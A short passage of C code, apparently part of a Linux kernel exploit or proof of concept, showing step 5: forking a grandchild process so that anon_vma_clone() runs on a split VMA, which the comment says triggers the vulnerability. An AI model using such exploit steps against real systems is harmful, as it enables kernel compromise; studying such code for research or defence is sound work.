        // 5. Fork a grandchild process. The creation of this process will involve
        // calling anon_vma_clone() on the split VMA structure of the child.
        // This is where the vulnerability is triggered.
        pid_t child_pid = fork();
        if (child_pid < 0) {
            perror("grandchild fork");
